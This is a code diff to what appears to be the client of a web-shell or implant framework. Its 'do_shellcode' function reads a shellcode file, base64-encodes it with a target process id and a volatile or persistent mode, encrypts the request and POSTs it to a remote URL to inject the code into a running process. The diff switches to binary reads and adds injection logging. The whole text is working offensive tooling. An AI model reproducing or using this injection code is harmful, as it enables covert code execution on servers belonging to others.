@@ -168,10 +168,10 @@ def do_shellcode(session, payload: str):
     
     pid = int(pid)
     
-    with open(shellcode_path) as f:
+    with open(shellcode_path, 'rb') as f:
         shellcode_bytes = f.read()
 
-    param_str = f'action=SHELLCODE&mode=' + ('volatile' if args.volatile else 'persistent') + f'&pid={pid}&buffer={base64.b64encode(shellcode_bytes).decode("utf-8")}'
+    param_str = f'action=SHELLCODE&mode=' + ('volatile' if args.volatile else 'persistent') + f'&pid={pid}&shellcode={base64.b64encode(shellcode_bytes).decode("utf-8")}'
     
     class_len = len(payload_bytes)
 
@@ -182,11 +182,14 @@ def do_shellcode(session, payload: str):
         'Content-Type': 'application/octet-stream'
     }
 
+    print_logs('Trying to inject shellcode...')
+
     resp = session.post(args.url, data=encrypted_payload, headers=headers)
 
     try:
         resp_text = aes_decrypt(resp.content).decode(args.encoding)
         print(resp_text)
+        print_success('Injected shellcode successfully')
     except Exception as ex:
         print(resp.text)
 
